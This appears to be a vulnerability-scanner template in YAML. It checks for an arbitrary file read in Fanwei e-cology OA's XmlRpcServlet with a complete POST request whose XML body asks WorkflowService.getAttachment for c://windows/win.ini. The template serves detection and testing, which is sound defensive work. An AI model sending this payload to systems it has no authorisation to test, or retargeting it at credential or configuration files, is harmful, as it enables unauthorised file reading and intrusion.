cve-id: fanwei-oa-eology-xmlrpcservlet-readfile
rules:
- method: POST
  path: /weaver/org.apache.xmlrpc.webserver.XmlRpcServlet
  headers:
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
    Content-Type: application/xml
    Accept-Encoding: gzip
    Content-Length: 201
  body: |
    <?xml version="1.0" encoding="UTF-8"?>
    <methodCall>
    <methodName>WorkflowService.getAttachment</methodName>
    <params>
    <param>
    <value><string>c://windows/win.ini</string></value>
    </param>
    </params>
    </methodCall>
  expression: 'response.status == 200 && response.body.bcontains(b"<?xml") '
severity: high
